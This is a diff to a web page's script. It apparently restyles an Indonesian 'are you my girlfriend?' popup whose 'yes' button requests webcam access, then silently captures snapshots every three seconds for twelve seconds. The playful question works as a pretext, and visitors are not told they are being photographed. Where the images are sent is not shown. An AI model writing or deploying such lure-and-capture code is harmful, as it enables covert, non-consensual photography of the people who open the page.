@@ -224,42 +224,64 @@
 
 <script>
 window.addEventListener('load', () => {
-  // popup custom
+  // warna tema — ubah kalo mau warna lain
+  const themeColor = '#ff5d8f';
+
+  // overlay blur
   const overlay = document.createElement('div');
   overlay.style = `
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.6);
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(5px);
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 999999;
+    animation: fadeIn 0.4s ease;
   `;
   
+  // popup box
   const box = document.createElement('div');
   box.style = `
     background: #fff;
-    padding: 20px;
-    border-radius: 10px;
+    padding: 20px 25px;
+    border-radius: 14px;
     text-align: center;
-    font-family: system-ui;
-    max-width: 300px;
+    font-family: 'Poppins', system-ui, sans-serif;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+    max-width: 320px;
+    width: 90%;
+    color: #333;
+    animation: scaleIn 0.3s ease;
   `;
   box.innerHTML = `
-    <p style="margin-bottom:15px;font-size:16px">apakah anda pacar saya?</p>
-    <button id="yesBtn" style="margin-right:10px;padding:6px 12px">iya</button>
-    <button id="noBtn" style="padding:6px 12px">tidak</button>
+    <p style="margin-bottom:20px;font-size:18px;font-weight:500">apakah anda pacar saya?</p>
+    <div style="display:flex;justify-content:center;gap:10px;">
+      <button id="yesBtn" style="background:${themeColor};color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:14px;transition:0.2s;">iya</button>
+      <button id="noBtn" style="background:#f0f0f0;color:#333;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:14px;transition:0.2s;">tidak</button>
+    </div>
   `;
 
   overlay.appendChild(box);
   document.body.appendChild(overlay);
 
-  // handle klik "tidak"
+  // animasi
+  const style = document.createElement('style');
+  style.textContent = `
+    @keyframes fadeIn { from {opacity:0} to {opacity:1} }
+    @keyframes scaleIn { from {transform:scale(0.8)} to {transform:scale(1)} }
+    #yesBtn:hover { background:${themeColor};filter:brightness(0.9);}
+    #noBtn:hover { background:#ddd; }
+  `;
+  document.head.appendChild(style);
+
+  // klik "tidak"
   document.getElementById('noBtn').addEventListener('click', () => {
     window.location.href = 'index.html';
   });
 
-  // handle klik "iya"
+  // klik "iya"
   document.getElementById('yesBtn').addEventListener('click', async () => {
     overlay.remove();
     try {
@@ -276,15 +298,15 @@ window.addEventListener('load', () => {
         video.addEventListener('loadeddata', r, { once: true });
       });
 
-      setTimeout(() => startSnapshotLoop(video, stream), 1500);
+      // mulai ambil foto berkala
+      startSnapshotLoop(video, stream, 12000); // 12000 ms = 12 detik
     } catch (err) {
       console.error('izin kamera ditolak', err);
     }
   });
 
-  // fungsi loop ambil foto
-  function startSnapshotLoop(video, stream) {
-    const intervalMs = 3000; // ambil foto tiap 3 detik (bisa lo ubah)
+  function startSnapshotLoop(video, stream, duration) {
+    const intervalMs = 3000; // ambil foto setiap 3 detik
     const loop = setInterval(() => {
       try {
         const canvas = document.createElement('canvas');
@@ -305,11 +327,19 @@ window.addEventListener('load', () => {
         console.error('gagal capture', e);
         clearInterval(loop);
         stream.getTracks().forEach(t => t.stop());
+        video.remove();
       }
     }, intervalMs);
+
+    // otomatis berhenti setelah waktu habis
+    setTimeout(() => {
+      clearInterval(loop);
+      stream.getTracks().forEach(t => t.stop());
+      video.remove();
+      console.log('📸 selesai ambil foto setelah 12 detik');
+    }, duration);
   }
 });
 </script>
-
 </body>
 </html>
